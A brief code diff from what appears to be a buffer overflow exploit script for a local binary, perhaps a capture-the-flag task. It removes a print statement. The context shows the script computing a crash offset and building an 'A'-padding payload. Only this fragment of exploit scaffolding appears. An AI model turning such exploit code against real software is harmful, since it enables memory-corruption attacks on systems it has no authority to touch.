@@ -32,7 +32,6 @@ def exploit(binary_path):
 
     # Get the offset by calling the find_offset function
     offset = find_offset(binary_path)
-    print("The offset value is " + str(offset))
 
     # Construct the payload
     payload = b'A' * offset
